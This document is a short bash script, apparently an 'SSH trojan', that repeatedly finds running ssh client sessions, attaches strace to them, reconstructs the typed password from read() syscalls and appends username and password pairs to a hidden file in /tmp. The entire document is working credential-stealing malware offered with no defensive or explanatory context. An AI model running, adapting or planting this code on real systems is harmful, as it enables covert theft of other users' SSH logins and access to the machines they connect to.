#!/bin/bash

# Output file path
store_file='/tmp/.log_sshtrojan2.txt'

if [[ ! -e $store_file ]]; then
	touch $store_file
fi

# Make sure strace is installed
strace=$(which strace)
if [[ -z "$strace" ]]; then
        echo "Strace cannot be found. Please install it."
        exit 1
fi

while [ 1 ]; do
	
	# Find the sshd server pid
	pid=$(ps aux | grep -w ssh | grep @ | awk '{print $2}')

	if [[ -n $pid ]]; then

		username=$(ps aux | grep -w ssh | grep @ | awk '{print $12}' | cut -d@ -f1)
		password=""
		
		# Trace the ssh process to read the password		
		strace -fv -e trace=read -p "$pid" 2>&1 | while IFS= read -r line; 
		do
			char=$(echo $line | awk '/read\(4,.*1\).*=.*1/ {print}' | cut -d'"' -f2)
			if [[ $char != '\n' ]]; then
				# Read the password until reach the newline character
				password+=$char

			else
				# Write credential to log file
				echo -e "Username: $username, password: $password" >> $store_file
				break
			fi

		done 
	fi

done